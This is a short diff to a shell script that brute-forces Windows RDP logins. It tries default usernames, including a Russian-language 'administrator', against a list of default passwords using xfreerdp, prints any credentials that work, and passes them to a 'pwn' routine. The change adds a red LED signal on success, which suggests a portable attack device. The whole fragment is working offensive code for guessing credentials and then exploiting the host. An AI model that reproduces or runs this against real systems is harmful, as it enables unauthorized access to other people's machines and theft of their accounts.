@@ -26,7 +26,8 @@ elif nc -nw $WAIT $1 $DPORT < /dev/null 2> /dev/null; then
 	echo '[*] bruteforcing rdp'
 	for user in администратор administrator admin; do
 		for password in $(cat on_client/bruteforce/default_pass_for_services_unhash.txt); do
-			if xfreerdp /v:$1:$DPORT /u:$user /p:"$password" /cert-ignore +auth-only /sec:nla > /dev/null 2> /dev/null; then 
+			if xfreerdp /v:$1:$DPORT /u:$user /p:"$password" /cert-ignore +auth-only /sec:nla > /dev/null 2> /dev/null; then
+				led red on 2> /dev/null
 				echo user:$user password:$password | grep 'password:' --color=auto
 				pwn "$1" "$user" "$password"
 				break
